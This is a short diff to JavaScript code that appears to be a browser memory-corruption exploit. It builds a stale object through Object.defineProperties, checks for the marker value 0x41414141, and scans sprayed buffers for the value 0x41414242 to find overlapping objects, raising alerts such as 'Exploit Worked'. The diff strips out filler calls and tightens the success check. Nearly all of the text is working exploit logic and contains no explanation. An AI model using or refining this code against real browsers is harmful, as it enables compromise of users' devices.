@@ -106,18 +106,6 @@ function smashed(stl) {
 
 
 function go_() {
-	var foo = 1;
-	foo = 2;
-	foo = 3;
-	foo = 4;
-	foo = 5;
-	uc = function(){ // useless call
-		var x = 0;
-		x += 1;
-		x = 0;
-	}
-	uc();uc();uc();
-	
 	if(smsh.length != 0x10) {
 		smashed();
 		return;
@@ -158,7 +146,7 @@ function go_() {
 	Object.defineProperties(target, props);
 	var stale = target.stale;
 
-	if(before_len != stale.length){
+	if((before_len != stale.length) && (stale[0] == 0x41414141)){
 		alert("Exploit Worked");
 		keep(arr);
 	} else {
@@ -166,23 +154,15 @@ function go_() {
 		return;
 	}
 	
-	// For some reason improves stability
-	//sleep(1000);
 
-	if(stale[0] != 0x41414141){
-		alert("stale[0] != 0x41414141");
-		return;
-	}
-	
+
 	stale[0] += 0x101;
 
-	uc();uc();uc();uc();
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				uc();uc();uc();uc();
 				alert("Found the object!!");
 
 				stale[0] = {
